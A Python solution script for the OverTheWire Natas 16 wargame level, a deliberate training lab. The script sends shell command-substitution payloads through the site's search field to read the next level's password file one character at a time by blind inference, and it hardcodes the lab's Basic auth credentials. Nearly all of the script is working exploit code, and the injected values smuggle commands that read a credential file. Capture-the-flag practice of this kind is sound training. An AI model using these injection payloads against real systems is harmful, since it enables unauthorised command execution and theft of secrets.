from base64 import b64encode

import requests

idx = 1
pw = ''
url = 'http://natas16.natas.labs.overthewire.org/index.php'
userAndPass = b64encode(b"natas16:WaIHEacj63wnNIBROHeqi3p9t0m5nhmh").decode("ascii")
headers = {'Authorization': 'Basic %s' % userAndPass}

def getMatch(needle):
    res = requests.post(url, headers=headers, data={'needle': needle})
    return res.text.splitlines()[22]


while idx < 32:
    print("looking for %i" % idx)
    # grep -i "^$(cut -c{idx} /etc/natas_webpass/natas17)" dictionary.txt
    match = getMatch("^$(cut -c%i /etc/natas_webpass/natas17)" % idx)
    if match == '</pre>':
        print(f"resolving number")
        # generates one . too much, 1 is minimum.
        # ergo: idx=1 outputs .
        match = getMatch("^$(printf .%.0s $(seq 0 $(cut -c"+str(idx)+" /etc/natas_webpass/natas17)))$")
        print("mapping length of %s to number" % match)
        match = str(len(match)-1)
    else:
        # alpha char matched, but case not known yet
        match = match[0]
        caseMatch = getMatch("^$(grep ^"+('.'*(idx-1))+"[a-z] /etc/natas_webpass/natas17)blizzard$")
        print(f"case match {caseMatch}")
        match = match.upper() if caseMatch == 'blizzard' else match.lower()
    pw += match
    print(pw)
    idx += 1
